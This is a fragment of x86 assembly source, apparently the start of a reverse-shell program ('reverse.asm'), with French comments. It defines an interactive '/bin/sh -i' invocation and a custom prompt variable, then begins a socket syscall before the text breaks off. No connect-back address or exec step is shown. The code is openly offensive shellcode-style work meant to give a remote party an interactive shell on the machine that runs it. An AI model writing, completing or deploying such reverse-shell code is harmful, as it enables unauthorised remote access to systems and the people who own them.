; nasm -f elf32 -g reverse.asm && ld -m elf_i386 reverse.o


global _start

section .data
    SHELL       dw      "/bin/sh", 0
    arg1        dw      "-i", 0
    ;env         dw      "PS1=",34,"\e[0",59,"31m[\u@\h \W]\$ \e[m",34, 0
    env         dw      "PS1=This is my prompt#",0
    parsearg    dd      SHELL, arg1, 0
    perseenv    dd      env, 0

section .text

_start:
; Creation du socket

        mov al, 0x66    ;syscall eax en hex

        mov bl, 0x1     ;SYS_CREATE